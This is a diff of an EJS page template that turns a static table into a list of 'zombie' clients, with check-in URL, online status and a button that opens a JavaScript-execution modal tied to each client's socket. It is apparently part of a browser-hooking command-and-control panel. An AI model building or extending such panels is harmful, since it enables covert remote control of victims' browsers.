@@ -290,7 +290,7 @@
                     <thead>
                       <tr>
                         <th>项目名称</th>
-                        <th>主机地址</th>
+                        <th>上线地址</th>
                         <th>状态</th>
                         <th>创建时间</th>
                         <th>更新时间</th>
@@ -298,28 +298,19 @@
                       </tr>
                     </thead>
                     <tbody>
+                      <% pcList.forEach(function(pc){ %>
                       <tr>
-                        <td>Trident</td>
-                        <td>Internet
-                          Explorer 4.0</td>
-                        <td>Internet
-                          Explorer 4.0</td>
-                        <td>Win 95+</td>
-                        <td> 4</td>
-                        <td>X</td>
-                      </tr>
-                      <tr>
-                        <td>Test</td>
-                        <td>http://www.baidu.com/ser.js</td>
-                        <td>Internet
-                          Explorer 4.0</td>
-                        <td>2015-04-03</td>
-                        <td>2015-04-03</td>
+                        <td><%= pc.project_name %></td>
+                        <td><%= pc.zombie_url %></td>
+                        <td><% if (pc.status) {%><p class="text-green">在线</p><%}else{%><p class="text-muted">离线</p><%}%></td>
+                        <td><%= pc.create_time %></td>
+                        <td><%= pc.update_time %></td>
                         <td>
-                          <a class="fa fa-fw fa-terminal" href="javascript:void(0)" data-toggle="modal" data-target="#execJSDiv"></a>
+                          <a class="fa fa-fw fa-terminal" href="#" data-toggle="modal" data-target="#execJSDiv" onclick="$('#pcID').val('<%= pc.socket_id %>')"></a>
                           <a class="glyphicon glyphicon-trash" href="#"></a>
                         </td>
                       </tr>
+                      <% }); %>
                     </tbody>
                   </table>
                 </div><!-- /.box-body -->
@@ -519,6 +510,7 @@
     <script src="dist/js/demo.js"></script>
     <script src="/dist/js/socket.io.js"></script>
     <script src="dist/js/execJS.js"></script>
+    <script src="dist/js/handlePC.js"></script>
     <!-- page script -->
     <script>
       $(function () {
